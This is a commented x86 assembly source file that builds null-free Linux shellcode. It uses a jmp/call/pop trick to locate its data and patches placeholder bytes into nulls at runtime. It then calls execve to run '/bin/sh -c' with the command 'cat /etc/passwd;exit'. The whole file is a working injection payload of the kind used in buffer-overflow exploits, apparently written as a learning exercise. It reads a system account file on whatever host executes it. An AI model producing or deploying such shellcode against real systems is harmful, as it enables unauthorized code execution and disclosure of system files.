			bits 32
			
			; find out where we are
start: 		jmp short codeEnd
start2:		pop esi
			
			; clear the A register using xor
			xor eax,eax
			
			; restore null bytes in data
			mov [byte esi+flagStr-exeStr-2],al			; move null byte to end of /bin/sh
			mov [byte esi+cmdStr-exeStr-1],al			; move null byte to end of -c
			mov [byte esi+arrayAddr-exeStr-1],al		; move null byte to end of shell command
			mov [byte esi+arrayAddr-exeStr+12],eax		; move null word to end of array
			
			; Restoring the array
            mov [byte esi+arrayAddr-exeStr],esi			; move "/bin/sh" into first value of array
            lea edi,[byte esi+flagStr-exeStr]			; move the address of flagStr at assembly time into edi register
            mov [byte esi+arrayAddr-exeStr+4],edi		; move "-c" into second value of array
            lea edi,[byte esi+cmdStr-exeStr]			; move the address of cmdStr at assembly time into edi register
            mov [byte esi+arrayAddr-exeStr+8],edi		; move "cat /etc/passwd;exitX" into third value of array
			
			; setup registers and make system call.
			mov al,0x0b									; move 0x0b into the lower 8 bits of the A register
			mov ebx,esi									; move "/bin/sh" into the B register
			lea ecx,[byte esi+arrayAddr-exeStr]			; move starting address of array into the C register
			xor edx,edx									; clear the D register using xor
			int 0x80									; trap command
codeEnd: 	call start2
			
			; data										; data has X as placeholder for null value
exeStr: 	db "/bin/shXy"
flagStr: 	db "-cX"
cmdStr: 	db "cat /etc/passwd;exitX"
arrayAddr: 	dd 0xffffffff								; default addresses of the array set to all 1
			dd 0xffffffff
			dd 0xffffffff
			dd 0xffffffff
newAddr:	dd newAddr-start							; placeholder to see size of program